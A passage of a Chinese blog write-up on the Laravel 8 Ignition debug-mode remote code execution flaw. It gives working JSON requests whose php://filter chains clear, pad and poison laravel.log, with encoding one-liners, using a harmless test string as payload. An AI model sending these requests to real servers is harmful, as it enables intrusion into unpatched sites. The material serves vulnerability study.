+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;suiyi&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>理想中是美好的，但意外却发生了</p>
+<p><img src="/img/laravel8-debug-rce/image-20210605165008739.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210605165008739.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210605165008739"></p>
+<p>上图中报错，是因为日志文件中含有 <code>=</code> 号，但等号在 base64编码中是结束用的填充符号，会使得PHP base64解码过滤器抛出异常<sup>[5]</sup>。</p>
+<p>原来，filter过滤器中的base64解码和直接用 <code>base64_decode</code>是不同的。3.3小节开头中用<code>base64_decode</code>函数字符串中含有 <code>=</code> 号是能正常解码的。</p>
+<p>但假设不存在 <code>=</code> 号，清空文件是无问题的哈</p>
+<p><img src="/img/laravel8-debug-rce/image-20210605151747374.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210605151747374.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210605151747374"></p>
+<p>或者一步到位，结合多个base64解码过滤器</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;suiyi&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最终发现base64过滤器各种直接用不上，但问题不大，<strong>这里记得他的一个特性，如果不存在 <code>=</code> 号，他可以帮助我们去掉非base64编码后的字符。</strong></p>
+<h3 id="3-4-考虑其他-filter-过滤器"><a href="#3-4-考虑其他-filter-过滤器" class="headerlink" title="3.4 考虑其他 filter 过滤器"></a>3.4 考虑其他 filter 过滤器</h3><p>清空文件除了使用 base64-decode过滤器，也可以使用，而且不会受到特殊符号的影响</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=consumed/resource=../storage/logs/laravel.log</span></span><br></pre></td></tr></table></figure>
+
+<p>Emm，不过就是不知道这个 <code>filter</code> 是如何发现的。。网上找了半天没找到</p>
+<p>至此，上面的问题还是没有解决</p>
+<p>问题在于，如何在存在<code>[prefix]</code> <code>[midfix1]</code> <code>[midfix2]</code> <code>[suffix]</code> 的情况下，如何让可控<code>PAYLOAD</code>被利用？</p>
+<p>来硬的不行，换个思路，假设可以让<code>[prefix]</code> <code>[midfix1]</code> <code>[midfix2]</code> <code>[suffix]</code>转换为不可见字符，保留 <code>PAYLOAD</code> 部分为可见字符，然后结合PHP base64 解码的特性，是不是就可以只保留 <code>PAYLOAD</code> 部分了？</p>
+<p>好像还真可以，利用<code>filter过滤器</code>把日志内容识别为 <code>UTF-16</code> 编码，并转换为 <code>UTF-8</code>编码，因为 <code>UTF-16</code> 是双字节编码，那么原有的 <code>[prefix]</code> 是否就全变为不可见字符？</p>
+<p>参考官方例子 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv">PHP: Conversion Filters - Manual</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">stream_filter_append(<span class="variable">$fp</span>, <span class="string">&#x27;convert.iconv.utf-16le.utf-8&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="string">&quot;T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="comment">/* Outputs: This is a test. */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后 <code>PAYLOAD</code> 部分，输入  <code>P\0A\0Y\0L\0O\0A\0D\0</code> ，写入时指定 utf16le -&gt; utf-8</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=convert.iconv.utf-16le.utf-8/resource=../storage/logs/laravel.log</span></span><br></pre></td></tr></table></figure>
+
+<p>转换为 UTF-8 刚刚好为 <code>PAYLAOD</code>，最后在 base64解码一下，刚刚好只剩下 <code>PAYLOAD</code> 部分。赶紧试试，太骚了这思路。</p>
+<p><img src="/img/laravel8-debug-rce/image-20210606092741651.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210606092741651.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210606092741651"></p>
+<p>发现写不进去。。仔细想想，<code>\0</code> 在PHP是阶段，会报错，也难怪，而且到时候 file_get_contets() 的时候，也会报错。</p>
+<p>这里又需利用到另外一个过滤器</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable">https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable</a></p>
+<p>我们可以先把 <code>\0</code> 编码为 <code>=00</code>，读取的时候解码即可。</p>
+<p>先写入PAYLOAD，这里为 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t&#x3D;00a&#x3D;00r&#x3D;00i&#x3D;00</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/laravel8-debug-rce/image-20210606101905575.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210606101905575.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210606101905575"></p>
+<p>然后写入，先解码 <code>=00</code> 然后在把<code>utf16</code>转换为<code>utf8</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8/resource=../storage/logs/laravel.log</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/laravel8-debug-rce/image-20210606104747901.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210606104747901.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210606104747901"></p>
+<p>又报错了，utf16要求双字节对齐，但日志文件来说，不一定是双字节对齐。处理方法很简单，任何数*2都是偶数，就双字节对齐啦，如变成下面这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2]部分PAYLOAD[suffix]</span><br><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2]部分PAYLOAD[suffix]</span><br></pre></td></tr></table></figure>
+
+<p>赶紧尝试一下 （</p>
+<p>不出意外，又报错了</p>
+<p><img src="/img/laravel8-debug-rce/image-20210607112439248.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210607112439248.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210607112439248"></p>
+<p>找了半天，原来<code>PAYLOAD</code>被部分截断了，然后截断的位置非常神奇，并且加了个点 <code>=0.</code>，导致解码错误，</p>
+<p><img src="/img/laravel8-debug-rce/image-20210607110143247.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210607110143247.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210607110143247"></p>
+<p>写个小demo，果然如此</p>
+<p><img src="/img/laravel8-debug-rce/image-20210607112920709.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210607112920709.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210607112920709"></p>
+<p>即我们的<code>部分PAYLOAD</code>导致出了问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2]部分PAYLOAD[suffix]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这个容易解决，查看日志文件，数一下发现只会截断前15个，我们这里填充个100个随意字符，这里选择填充<code>A</code>，怎么也不会殃及到我们的<code>PAYLOAD</code></p>
+<p>也就是说，我们现在不用关心<code>部分PAYLOAD</code>了，现变为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2][suffix]</span><br><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2][suffix]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>先清空日志，然后发两次</p>
+<p><img src="/img/laravel8-debug-rce/image-20210607140820694.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210607140820694.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210607140820694"></p>
+<p>转换</p>
+<p><img src="/img/laravel8-debug-rce/image-20210607140842883.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210607140842883.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210607140842883"></p>
+<p><img src="/img/laravel8-debug-rce/image-20210607140919471.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210607140919471.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210607140919471"></p>
+<p>nice~</p>
+<p>特殊字符用base64编码去特殊字符就行，当然我们的 <code>tari</code> 没有进行base64编码，所以直接base64解码，特殊字符是去掉了，不过我们的 <code>tari</code> 也会被解码为乱码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;tari&quot;</span> | base64 | sed -E <span class="string">&#x27;s/./&amp;\=00/g&#x27;</span> </span><br><span class="line"><span class="comment"># 输出 d=00G=00F=00y=00a=00Q=00o=00==00</span></span><br></pre></td></tr></table></figure>
+
+<p>看到了熟悉的有问题的子串 <code>==00</code> 号，就和我们日志里出现的 <code>=0.</code> 类似，都会有问题</p>
+<p>这里有两个方法</p>
+<ol>
+<li>编码 <code>=</code>，即编码为 <code>=3D</code></li>
+<li>base64编码后，把<code>=</code>号去掉，因为PHP的base64解码发现位数不为4的整数倍，会自动在后方加 <code>=</code> 号，这点在3.3小节说过</li>
+</ol>
+<p>这里选择第2种方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;tari&quot;</span> | base64 | sed -E <span class="string">&#x27;s/=+$//g&#x27;</span> | sed -E <span class="string">&#x27;s/./&amp;\=00/g&#x27;</span></span><br><span class="line"><span class="comment"># 输出 d=00G=00F=00y=00a=00Q=00o=00</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-5-两个PAYLOAD和双字节对齐"><a href="#3-5-两个PAYLOAD和双字节对齐" class="headerlink" title="3.5 两个PAYLOAD和双字节对齐"></a>3.5 两个PAYLOAD和双字节对齐</h3><p>但是这样还有个问题，就是我们的 <code>PAYLOAD</code> 出现了两次，处理方法很简单，把原来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2][suffix]</span><br><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2][suffix]</span><br></pre></td></tr></table></figure>
+
+<p>转换为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD_1[midfix1]PAYLOAD_1[midfix2][suffix]</span><br><span class="line">[prefix]PAYLOAD_2[midfix1]PAYLOAD_2[midfix2][suffix]</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>PAYLOAD_1</code>随意即可，无需为真的<code>PAYLOAD</code>，比如我们可以把 <code>PAYLOAD_1</code> 变为保持为100个 <code>&#39;A&#39;</code> ，因为没有 <code>\0</code> ，所以从<code>utf16</code>转换为<code>utf-8</code>会把他转换为”乱码”</p>
+<p>到这里可能会有所疑问，我们的 <code>PAYLOAD_2</code> 不是也出现了两次么？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD_2[midfix1]PAYLOAD_2[midfix2][suffix]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里也挺巧妙的，一开始我们是清空了日志的，这时我们的日志文件 <code>laravel.log</code> 文件为空。</p>
+<p> <code>PAYLOAD_1</code> 和 <code>PAYLOAD_2</code> 前面都填充了 100个 <code>A</code>，所以 <code>[midfix1][midfix2][suffix]</code>部分是一样的，而且是不会变的。</p>
+<p><img src="/img/laravel8-debug-rce/image-20210608094733672.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210608094733672.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210608094733672"></p>
+<p><img src="/img/laravel8-debug-rce/image-20210608094656287.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210608094656287.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210608094656287"></p>
+<p>首先看看整体是不是双字节对齐的</p>
+<p><strong>==证明1：==</strong></p>
+<ul>
+<li><p><code>PAYLOAD_1</code> 是偶数，已对齐；</p>
+</li>
+<li><p>2个<code>[prefix][midfix1][midfix2][suffix]</code> 是一样的，无论奇偶与否，乘以2都是偶数，对齐；</p>
+</li>
+<li><p><code>PAYLOAD_2</code>也是有两个，对齐；</p>
+</li>
+</ul>
+<p>所以整体肯定是对齐的。不然过滤器 <code>convert.iconv.utf-16le.utf-8</code> 无法正常工作。</p>
+<p><strong>==证明1证毕==</strong></p>
+<p>接下来考虑顺序问题，会不会因 <code>奇数+P\0A\0</code> 刚好把我们精心构造的<code>PAYLOAD</code>给破坏了呢？</p>
+<p>我们发的第一个填充包，整体可能是奇数，也可能是偶数，，接下来分两种情况分别讨论</p>
+<ul>
+<li><strong>前提</strong></li>
+</ul>
+<p><code>[prefix]</code> 长度为 53，为奇数，这里应该都是一样的，尝试过使用内网其他机器访问，也是 local.ERROR</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2021-06-07 07:52:32] local.ERROR: file_get_contents(</span><br></pre></td></tr></table></figure>
+
+<p><code>midfix1</code> 长度为 119，为奇数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">): failed to open stream: No such file or directory &#123;&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents(</span><br></pre></td></tr></table></figure>
+
+
+
+<p>设定 S<sub>i</sub> 表示串下标为 i 之前的子串</p>
+<ul>
+<li><strong>当第1个填充包为奇数</strong></li>
+</ul>
+<p>由<strong>证明1</strong>知，我们发的2个包肯定是双字节对齐，也就是偶数，那么此时第2个填充包肯定也为奇数</p>
+<p>S<sub>i</sub> = 第1个填充包（奇数） + 第二个包的<code>[prefix]</code>部分（奇数） -&gt; 偶数</p>
+<p>此时没有破坏 <code>第1个PAYLOAD_2</code></p>
+<p>然后 <code>[midfix2]</code>的长度 S<sub>i+1</sub>是奇数，此时 S<sub>i+1</sub> + <code>P\0A\0</code> 肯定会破坏<code>第2个PAYLOAD_2</code>，也就是说这部分经转换为乱码</p>
+<p>因为此前都是偶数，<code>[midfix2]</code> 到最后肯定也是偶数，不会破坏双字节对齐</p>
+<p>最终输出的为，<code>base64_decode(乱码+第1个PAYLOAD_2+乱码)</code>，就仅有 <code>PAYLOAD_2</code></p>
+<p>因此这种情况最终只有1个我们构造的<code>PAYLOAD</code>，符合条件</p>
+<ul>
+<li><strong>当第一个填充包为偶数</strong></li>
+</ul>
+<p>由<strong>证明1</strong>知，我们发的2个包肯定是双字节对齐，也就是偶数，那么此时第2个填充包肯定也为偶数</p>
+<p>S<sub>i+2</sub> = 第1个填充包（偶数） + 第二个包的<code>[prefix]</code>部分（奇数） -&gt; 奇数，</p>
+<p> S<sub>i+2</sub> （奇数） + <code>P\0A\0</code> 肯定会破坏<code>第1个PAYLOAD_2</code>，这部分都为乱码，不用理会</p>
+<p>此时 S<sub>i+3</sub>  =  S<sub>i+2</sub> （奇数） +  <code>第1个PAYLOAD_2</code>（偶数） -&gt; 奇数</p>
+<p>然后S<sub>i+4</sub> = S<sub>i+3</sub>（奇数） + <code>[midfix2]</code> （奇数） -&gt; 偶数</p>
+<p>S<sub>i+4</sub>（偶数）并不会破坏 <code>第二个PAYLOAD_2</code> 的结构，</p>
+<p>S<sub>i+4</sub>（偶数）+ <code>第二个PAYLOAD_2</code> (偶数) -&gt; 偶数，所以后面也为偶数，不会破坏双字节对齐</p>
+<p>最终输出的为，<code>base64_decode(乱码+第2个PAYLOAD_2+乱码)</code>，就仅有 <code>PAYLOAD_2</code></p>
+<p>因此这种情况最终只有1个我们构造的<code>PAYLOAD</code>，符合条件</p>
+<ul>
+<li><strong>综上</strong></li>
+</ul>
+<p>下面这种构造方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD_1[midfix1]PAYLOAD_1[midfix2][suffix]</span><br><span class="line">[prefix]PAYLOAD_2[midfix1]PAYLOAD_2[midfix2][suffix]</span><br></pre></td></tr></table></figure>
+
+<p><code>[prefix]</code> 和 <code>[midfix1]</code> 都为奇数， 且 <code>PAYLOAD_1</code> 为长度偶数，最终可以安全的得到一个 <code>PAYLOAD_2</code></p>
+<ul>
+<li><strong>另外一种情形</strong></li>
+</ul>
+<p>因为包的 <code>[prefix]</code> 和 <code>[midfix1]</code>  部分刚好都为奇数，所以是这样。</p>
+<p>如果是其他情况呢，假设 <code>[prefix]</code> 和 <code>[midfix1]</code>  是前奇后偶的情况？</p>
+<p>这个和实际利用情况很像，因为如果file_get_contents 输入的参数过长，<code>[midfix1]</code> 会变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">): failed to open stream: Invalid argument &#123;&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents(</span><br></pre></td></tr></table></figure>
+
+<p>长度是 110</p>
+<p>就需要在我们想要的PAYLOAD最后填充 <code>=00</code>，就可以了，因为这样无论第1个或第2个PAYLOAD前面是奇数还是偶数，首先双字节一定是对齐的，然后第1个PAYLOAD前是奇数，会吃掉第1个PAYLOAD，又因PAYLOAD后有一个<code>=00</code> 会吃掉后面一个字符，这样就变成了偶数，所以第二个不会被吃，反则反之。</p>
+<p>所以前奇后偶的情况是这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD_1[midfix1]PAYLOAD_1[midfix2][suffix]</span><br><span class="line">[prefix]PAYLOAD_2&#x3D;00[midfix1]PAYLOAD_2&#x3D;00[midfix2][suffix]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>因为第1个payload前只有奇数或偶数两种情况，所以考虑这两种情况足以。</p>
+<p>那么针对这两种情况，有没有通用的解决方法呢？（我暂没发现。。</p>
+<h3 id="3-6-整合"><a href="#3-6-整合" class="headerlink" title="3.6 整合"></a>3.6 整合</h3><ol>
+<li>清空日志</li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/read=consumed/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/laravel8-debug-rce/image-20210608092843302.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210608092843302.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210608092843302"></p>
+<ol start="2">
+<li>写入填充数据</li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/laravel8-debug-rce/image-20210608092629402.png?lastModify=1623115607" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210608092629402.png?lastModify=1623115607" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210608092629402"></p>
+<ol start="3">
+<li>写入我们可控数据</li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd=00G=00F=00y=00a=00Q=00o=00&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里Payload字段比较短，为双奇数型，不需要处理</p>
+<p><img src="/img/laravel8-debug-rce/image-20210609000509235.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210609000509235.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210609000509235"></p>
+<p>如果比较长，比如真实漏洞利用，一般为前奇后偶型，需要在<code>PAYLOAD</code>后缀加上 <code>=00</code> 保证对齐</p>
+<ol start="4">
+<li>转换去除无关数据</li>
+</ol>
